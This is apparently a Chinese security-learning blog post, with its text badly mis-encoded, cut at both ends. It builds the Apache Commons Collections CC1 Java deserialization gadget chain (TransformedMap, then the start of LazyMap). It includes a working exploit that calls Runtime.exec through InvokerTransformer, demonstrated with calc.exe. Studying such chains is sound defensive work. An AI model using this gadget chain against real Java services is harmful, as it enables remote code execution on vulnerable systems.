çœ‹çš„å¤´æ™•ã€‚<br></font><font style="color:rgb(119, 119, 119);">å®é™…ä¸Šæ˜¯é’»äº†æ­»èƒ¡åŒï¼šinvokeçš„returnæ˜¯æ ¹æ®è¢«è°ƒç”¨çš„å‡½æ•°returnå•¥ï¼Œinvokeå°±returnå•¥ã€‚<br></font><font style="color:rgb(119, 119, 119);">å°±å¥½æ¯”æˆ‘invokeä¸€ä¸ªæˆ‘è‡ªå®šä¹‰çš„æ–¹æ³•aï¼Œåœ¨aä¸­ï¼Œæˆ‘returnäº†å­—ç¬¦ä¸²â€1â€ã€‚é‚£ä¹ˆå°±æ˜¯invokeçš„ç»“æœå°±æ˜¯å­—ç¬¦ä¸²â€1â€ã€‚<br></font>çœ‹ä»¥ä¸Šçš„è¿‡ç¨‹å°±æ˜¯ç¬¬ä¸€æ¬¡Runtime.getRuntime()çš„ç»“æœè¾“å…¥äº†ä¸‹ä¸€ä¸ªInvokerTransformer</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714491785599-c0467126-1b38-443b-b3c4-b0c79d7f1e12.png"></p><p>ä»¥ä¸Šæ„Ÿè§‰æ˜¯ä¸‡äº‹å¤§å‰äº†ï¼ä½†æ˜¯å®é™…ä¸Šå¹¶ä¸æ˜¯â€¦</p><p>å›æƒ³ä¹‹å‰å¯¹äºInvokerTransformerä¸­Class cls &#x3D; input.getClass();çš„è§£é‡Š</p><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„åˆ°input.getClass()è¿™ä¸ªæ–¹æ³•ä½¿ç”¨ä¸Šçš„ä¸€äº›åŒºåˆ«ï¼š</p><ul><li>å½“inputæ˜¯ä¸€ä¸ªç±»çš„å®ä¾‹å¯¹è±¡æ—¶ï¼Œè·å–åˆ°çš„æ˜¯è¿™ä¸ªç±»</li><li>å½“inputæ˜¯ä¸€ä¸ªç±»æ—¶ï¼Œè·å–åˆ°çš„æ˜¯java.lang.Class</li></ul><p>æˆ‘ä»¬æ¥æ¨æ¼”ç¬¬ä¸€æ¬¡InvokerTransformerçš„åå°„è°ƒç”¨ï¼Œå³å¾—åˆ°Runtimeç±»å¯¹è±¡çš„getRuntimeæ–¹æ³•è°ƒç”¨:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//InvokeTransformerå…³é”®è¯­å¥ï¼š</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;<span class="comment">//inputä¸ºæˆ‘ä»¬è®¾ç½®çš„å¸¸é‡Runtime.class</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();<span class="comment">//ï¼ï¼ï¼è¿™é‡Œç”±äºinputæ˜¯ä¸€ä¸ªç±»ï¼Œä¼šå¾—åˆ°java.lang.Class</span></span><br><span class="line"><span class="comment">//åœ¨java.lang.Classç±»ä¸­å»å¯»æ‰¾getRuntimeæ–¹æ³•ä¼å›¾å¾—åˆ°Runtimeç±»å¯¹è±¡ï¼Œæ­¤å¤„æŠ¥é”™ï¼ï¼</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">é‚£ä¹ˆæˆ‘ä»¬å¥½åƒé™·å…¥äº†ä¸€ä¸ªæ­»èƒ¡åŒï¼š<br></font><font style="color:rgb(51, 51, 51);">å¾—åˆ°Runtimeç±»å®ä¾‹æ‰èƒ½è°ƒç”¨execæ–¹æ³•ã€‚<br></font>è€Œå¾—åˆ°Runtimeç±»å®ä¾‹ä½œä¸ºinputï¼Œæ‰èƒ½å¾—åˆ°Runtime classï¼Œæ‰èƒ½æ‰¾åˆ°getRuntimeæ–¹æ³•ï¼Œå¾—åˆ°Runtimeç±»å®ä¾‹â€¦â€¦â€¦</p><p>ç¬¬äºŒç‚¹ä¹æ­¥ è¿˜æ˜¯åå°„æœºåˆ¶</p><p>é‚£ä¹ˆæˆ‘ä»¬é€šè¿‡ç›´æ¥è°ƒç”¨Runtime.getRuntimeæ–¹æ³•å¥½åƒæ˜¯è¡Œä¸é€šäº†,æœ‰æ²¡æœ‰å…¶ä»–æ–¹æ³•å‘¢ï¼Ÿ</p><p><strong>è¿˜æ˜¯åå°„æœºåˆ¶</strong></p><p>å·²çŸ¥ï¼š</p><ol><li>æˆ‘ä»¬å¼€å¤´ä¸èƒ½è·å¾—Class.forName(â€œjava.lang.Runtimeâ€)ï¼Œåªèƒ½å¾—åˆ°Class.forName(â€œjava.lang.Classâ€)</li><li><font style="color:rgb(51, 51, 51);">æˆ‘ä»¬å¯ä»¥æœ‰ä»»æ„çš„åå°„æœºåˆ¶<br></font>æ±‚ï¼š</li><li><font style="color:rgb(51, 51, 51);">æˆ‘ä»¬è¦è·å–åˆ°Runtime.getRunimeå‡½æ•°ï¼Œå¹¶æ‰§è¡Œå®ƒã€‚<br></font>è§£ï¼š</li><li>é€šè¿‡åå°„æœºåˆ¶è·å–åå°„æœºåˆ¶ä¸­çš„getMethodç±»ï¼Œç”±äºgetMethodç±»æ˜¯å­˜åœ¨Classç±»ä¸­ï¼Œå°±ç¬¦åˆå¼€å¤´Classç±»çš„é™åˆ¶</li><li>é€šè¿‡getMethodå‡½æ•°è·å–Runtimeç±»ä¸­çš„getRuntimeå‡½æ•°<ul><li>åœ¨å“ªä¸ªç±»ä¸­è°ƒç”¨getMethodå»è·å–æ–¹æ³•ï¼Œå®é™…ä¸Šæ˜¯ç”±invokeå‡½æ•°é‡Œé¢çš„çš„ç¬¬ä¸€ä¸ªå‚æ•°objå†³å®šçš„</li></ul></li><li>å†é€šè¿‡åå°„æœºåˆ¶è·å–åå°„æœºåˆ¶ä¸­çš„invokeç±»ï¼Œæ‰§è¡Œä¸Šé¢è·å–çš„getRuntimeå‡½æ•°</li><li>invokeè°ƒç”¨getRuntimeå‡½æ•°ï¼Œè·å–Runtimeç±»çš„å®ä¾‹<ul><li>è¿™é‡Œåœ¨ä½¿ç”¨åå°„æœºåˆ¶è°ƒç”¨getRuntimeé™æ€ç±»æ—¶ï¼Œinvokeé‡Œé¢ç¬¬ä¸€ä¸ªå‚æ•°objå…¶å®å¯ä»¥ä»»æ„æ”¹ä¸ºnullï¼Œæˆ–è€…å…¶ä»–ç±»ï¼Œè€Œä¸ä¸€å®šè¦æ˜¯Runtimeç±»</li></ul></li></ol><p>å…·ä½“å˜åŒ–ç»†èŠ‚ï¼Œæˆ‘é€‰æ‹©æŠŠå®ƒæ”¾åœ¨åå°„æœºåˆ¶ä¸€æ–‡ä¸­è¯´æ˜ï¼Œè¿™è¾¹ç»™å‡ºç»“æœã€‚</p><p><font style="color:rgb(51, 51, 51);">æˆ‘ä»¬çš„æœ€ç»ˆç›®çš„æ˜¯æ‰§è¡Œ<br></font>Class.forName(â€œjava.lang.Runtimeâ€).getMethod(â€œgetRuntimeâ€).invoke(Class.forName(â€œjava.lang.Runtimeâ€)</p><p>å…ˆæ¥è·å–getRuntimeç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç›®æ ‡è¯­å¥</span></span><br><span class="line">Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>)</span><br><span class="line"><span class="comment">//ä½¿ç”¨java.lang.Classå¼€å¤´</span></span><br><span class="line">Class.forName(<span class="string">&quot;java.lang.Class&quot;</span>).getMethod(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;)</span><br><span class="line">.invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>),<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">//invokeå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯Runtimeç±»ï¼Œæˆ‘ä»¬éœ€è¦åœ¨Runtimeç±»ä¸­å»æ‰§è¡ŒgetMethodï¼Œè·å–getRuntimeå‚æ•°</span></span><br></pre></td></tr></table></figure><p>å¯¹ç…§ç€InvokerTransformerç±»è½¬å˜ä¸ºtransformersæ ¼å¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();<span class="comment">//cls = java.lang.Class</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes); <span class="comment">//getMethodæ–¹æ³•</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs); <span class="comment">//åœ¨Runtimeä¸­æ‰¾getRuntimeæ–¹æ³•ï¼Œå¹¶è¿”å›è¿™ä¸ªæ–¹æ³•</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="comment">//è¿˜éœ€è¦å¡«å…… è°ƒç”¨getRuntimeå¾—åˆ°Runtimeå®ä¾‹,</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿˜å·®æ‰§è¡Œè·å–åˆ°çš„getRuntimeï¼Œä¸‹ä¸€ä¸ªinputæ˜¯ä¸Šä¸€ä¸ªæ‰§è¡Œæ¥å£ï¼Œç»§ç»­å¯¹ç…§</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//input=getRuntimeè¿™ä¸ªæ–¹æ³•</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();<span class="comment">//cls = java.lang.Methodï¼ˆgetRuntimeæ–¹æ³•æ˜¯methodç±»ï¼‰</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes); <span class="comment">//åœ¨methodç±»ä¸­æ‰¾åˆ°invokeæ–¹æ³•ï¼Œmethod=invokeæ–¹æ³•</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs); <span class="comment">//è°ƒç”¨invokeæ–¹æ³•ï¼Œinput=getRuntimeè¿™ä¸ªæ–¹æ³•ï¼Œä¼ å…¥è‡ªå®šä¹‰çš„å‚æ•°</span></span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">ä»¥ä¸Šæœ€åä¸€æ­¥æœ‰ç‚¹å¤æ‚ï¼Œmethodå°±æ˜¯invokeæ–¹æ³•ï¼Œç›¸å½“äºä½¿ç”¨invokeè°ƒç”¨äº†invokeå‡½æ•°ã€‚<br></font>é¦–å…ˆthis.iMethodName, this.iParamTypesæ˜¯æ ¹æ®invokeæ¥å£è€Œå®šçš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object obj, Object... args)</span></span><br><span class="line"><span class="comment">//this.iMethodName=&quot;invoke&quot;</span></span><br><span class="line"><span class="comment">//this.iParamTypes=new Class[] &#123;Object.class, Object[].class &#125;</span></span><br><span class="line"><span class="comment">//å¤–é¢classã€Objectå°è£…æ˜¯InvokerTransformerç±»çš„æ„é€ å‡½æ•°è¦æ±‚</span></span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">æŒ‰ç…§invokeä¸­çš„inputæ‰æ˜¯å®ƒè¦è°ƒç”¨çš„ç¯å¢ƒçš„å‡†åˆ™ã€‚<br></font>invokeæ–¹æ³•.invoke(input, this.iArgs)å®é™…ä¸Šç­‰äºinput.invoke(this.iArgs)<font style="color:rgb(51, 51, 51);">ï¼Œ<br></font>è€Œinput&#x3D;getRuntimeæ–¹æ³•ï¼Œé‚£ä¹ˆåªè¦å¡«å…¥this.iArgså°±å¥½äº†</p><p><font style="color:rgb(51, 51, 51);">åˆç”±äºgetRuntimeæ˜¯ä¸ªé™æ€å‡½æ•°ï¼Œä¸ç”¨å¤ªçº ç»“è¾“å…¥objï¼Œå†™ä½œnullã€‚getRuntimeæ–¹æ³•ä¸éœ€è¦å‚æ•°ã€‚<br></font>this.iArgs&#x3D;null,new Object[0]</p><p>é‚£ä¹ˆæ•´åˆå°±å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">ä»¥ä¸Šä»£ç å…¶å®å°±æ˜¯ç­‰åŒäº<br></font>((Runtime)Runtime.class.getMethod(â€œgetMethodâ€,null).invoke(null,null)).exec(â€œcalc.exeâ€);</p><p>å°†ä¿®æ”¹åçš„ä»£ç é‡æ–°è¿è¡Œçœ‹çœ‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>); <span class="comment">//ç»™mapä¸€ä¸ªé”®å€¼å¯¹ï¼Œæ–¹ä¾¿éå†</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ„é€ transformedmapæ˜¯è°ƒç”¨tranform()çš„å‰ç½®æ¡ä»¶</span></span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">                map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–sun.reflect.annotation.AnnotationInvocationHandlerç±»çš„Classå¯¹è±¡</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br><span class="line">        <span class="comment">//serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p>å‘ç°è¿˜æ˜¯ä¸èƒ½è¿è¡Œæˆ‘ä»¬åŠ¨æ€è°ƒè¯•çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714492748596-0fb8e329-f004-47b3-a544-e3e35b9e90b8.png"></p><p>å‘ç°åœ¨è¿™é‡Œä¸ºç©ºæ‰€ä»¥ä¸èƒ½è¿›å…¥ifæ¡ä»¶ï¼Œä¹Ÿå°±æ— æ³•è°ƒç”¨setValueæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714493360560-346d68a7-c71d-42f7-a64d-f836b8c231d1.png"></p><p>åœ¨è¿™é‡Œæˆ‘ä»¬å‘ç°ä»–å›å»è·å–æˆ‘ä»¬ä¼ å…¥çš„æ³¨è§£ç±»å‹å¹¶ä¸”è·å–æ³¨è§£é‡Œé¢æ–¹æ³•çš„åå­—ï¼Œç„¶åé€šè¿‡åˆ¤æ–­æˆ‘ä»¬ä¼ å…¥çš„åå­—æ˜¯å¦ä¸æ³¨è§£é‡Œçš„åå­—æ˜¯å¦ä¸€è‡´ï¼Œä¸€è‡´åˆ™ä¸ä¸ºç©ºå¦åˆ™ä¸ºç©ºå°±ä¸è¿›å…¥ifæ¡ä»¶ã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å­å•Šputæ—¶å°†é”®çš„å€¼æ”¹æˆæ³¨è§£ç±»å‹é‡Œé¢çš„æ–¹æ³•åå³å¯ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714493512596-ca057800-313a-4866-8652-f0625c253621.png"></p><p>å¯ä»¥çœ‹åˆ°Targetçš„æ–¹æ³•åæ—¶valueæ‰€ä»¥æ”¹æˆvalueå°±å¯ä»¥äº†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714493541211-ea1119a7-895d-48e2-8286-e78b5d30d5bb.png"></p><p>è¿™æ ·å°±å¯ä»¥æ‰§è¡Œäº†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714493565966-39b0b375-5f9e-41e0-8db4-f32dfb878fd3.png"></p><h4 id="cc1TransformedMapè°ƒç”¨é“¾"><a href="#cc1TransformedMapè°ƒç”¨é“¾" class="headerlink" title="cc1TransformedMapè°ƒç”¨é“¾"></a>cc1TransformedMapè°ƒç”¨é“¾</h4><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714626920076-d1f2e785-11df-4e1c-8f38-31c0b67b6f00.png"></p><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/">https://xz.aliyun.com/</a></p><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.337.search-card.all.click&vd_source=82398f68c82cb90e0d9aa4fea90e36a0">https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from&#x3D;333.337.search-card.all.click&amp;vd_source&#x3D;82398f68c82cb90e0d9aa4fea90e36a0</a></p><p><a href="https://blog.csdn.net/weixin_49047967/article/details/134763883">https://blog.csdn.net/weixin_49047967&#x2F;article&#x2F;details&#x2F;134763883</a></p><h2 id="4-java-cc1é“¾-LazyMap"><a href="#4-java-cc1é“¾-LazyMap" class="headerlink" title="4.java cc1é“¾-LazyMap"></a>4.java cc1é“¾-LazyMap</h2><p>LazyMapå’ŒTransformedMapç±»ä¼¼ï¼Œéƒ½æ¥è‡ªäºCommon-Collectionsåº“ï¼Œå¹¶ç»§æ‰¿äº†</p><p>AbstractMapDecoratorã€‚</p><p>TransformedMapçš„æ¼æ´è§¦å‘ç‚¹ï¼šæ˜¯åœ¨åˆ©ç”¨putæ–¹æ³•å†™å…¥å…ƒç´ çš„æ—¶å€™è§¦å‘äº†transformæ–¹æ³•ä»è€Œè§¦å‘äº†æˆ‘ä»¬æ„é€ çš„æ¶æ„åˆ©ç”¨é“¾</p><p>LazyMapè§¦å‘ç‚¹ä¸TransformedMapæœ‰ç‚¹å·®åˆ«æˆ‘ä»¬è¿˜æ˜¯å‘ä»¥å‰é€šè¿‡æŸ¥æ‰¾transfromçš„è°ƒç”¨æ–¹æ³•æ¥çœ‹çœ‹ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714554338581-4bcad701-9832-4724-b268-bc7bcadcb3f9.png"></p><p>å‘ç°LazyMapçš„getæ–¹æ³•ä¸­factoryå¯¹è±¡è°ƒç”¨äº†transformæ–¹æ³•æ‰€ä»¥åªè¦æˆ‘ä»¬èƒ½å¤Ÿå°†factoryçš„å¯¹è±¡è®¾ä¸ºinvokertransformerå¯¹è±¡ï¼Œå½“map.containskey(key) &#x3D;&#x3D; falseï¼Œå°±ä¼šè°ƒç”¨factory.transformã€‚å°±å¯ä»¥è¿›è¡Œrce</p><p>æ‰€ä»¥æŸ¥çœ‹ä¸€ä¸‹LazyMapçš„æ„é€ æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å‘ç°æ˜¯factoryå¯¹è±¡æ˜¯å¯æ§çš„ï¼Œä¸è¿‡è¿™é‡Œæ˜¯protectedç±»å‹æ‰€ä»¥ä¸èƒ½ç›´æ¥å®ä¾‹åŒ–ï¼Œä½†æ˜¯LazyMapä¸­ä¹Ÿæœ‰ä¸€ä¸ªé™æ€æ–¹æ³•decorateå¯ä»¥å®ä¾‹åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åœ¨TransformedMapåˆ©ç”¨é“¾å®Œå–„è¿™ç¯‡æ–‡ç« ä¸­æˆ‘ä»¬æœ‰åˆ†æAnnotationInvocationHandlerï¼Œåœ¨å…¶readObjectæ–¹æ³•ä¸­é€šè¿‡è°ƒç”¨setValueæ·»åŠ å…ƒç´ æ¥è§¦å‘transformã€‚ä½†æ˜¯åœ¨readObjectæ–¹æ³•ä¸­æ²¡æœ‰ç›´æ¥è°ƒç”¨åˆ°Mapçš„getæ–¹æ³•ã€‚ä¸è¿‡ysoserialçš„ä½œè€…æ‰¾åˆ°äº†åœ¨è¯¥ç±»çš„invokeæ–¹æ³•ä¸­è°ƒç”¨äº†getæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714554837323-4cf489a2-de94-4c92-8e3c-8e3fca36fd6c.png"></p><p>ä½†æ˜¯ååºåˆ—åŒ–çš„æ—¶å€™åº”è¯¥å¦‚ä½•è§¦å‘è¯¥æ–¹æ³•å‘¢ï¼Œæˆ‘ä»¬æƒ³åˆ°äº†javaçš„åŠ¨æ€ä»£ç†ï¼Œè¿™é‡Œå‚è€ƒ<a href="https://www.yuque.com/attachments/yuque/0/2024/pdf/25729212/1714631676669-3aecdb26-7ebe-4a78-83d3-1e71ac849c83.pdf">Javaå®‰å…¨æ¼«è°ˆ - 11.ååºåˆ—åŒ–ç¯‡(5).pdf</a><a href="https://www.yuque.com/attachments/yuque/0/2024/pdf/25729212/1714631676791-e9c42936-3bc0-4c29-b034-115f85120c57.pdf">Javaå®‰å…¨æ¼«è°ˆ - 10.ç”¨TransformedMapç¼–å†™çœŸæ­£çš„POC.pdf</a></p><p><a href="https://mp.weixin.qq.com/s/doU_WAxgCHpApPpogngVtg">https://mp.weixin.qq.com/s/doU_WAxgCHpApPpogngVtg</a>ã€pç‰›çš„æ–‡ç« è§£é‡Šä¸ºä»€ä¹ˆå¯ä»¥åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å¯ä»¥è°ƒç”¨invokeæ–¹æ³•</p><h3 id="Javaå¯¹è±¡ä»£ç†"><a href="#Javaå¯¹è±¡ä»£ç†" class="headerlink" title="Javaå¯¹è±¡ä»£ç†"></a>Javaå¯¹è±¡ä»£ç†</h3><p>ä½œä¸ºä¸€é—¨é™æ€è¯­è¨€ï¼Œå¦‚æœæƒ³åŠ«æŒä¸€ä¸ªå¯¹è±¡å†…éƒ¨çš„æ–¹æ³•è°ƒç”¨ï¼Œå®ç°ç±»ä¼¼PHPçš„é­”æœ¯æ–¹æ³• __call ï¼Œæˆ‘ä»¬éœ€ è¦ç”¨åˆ° 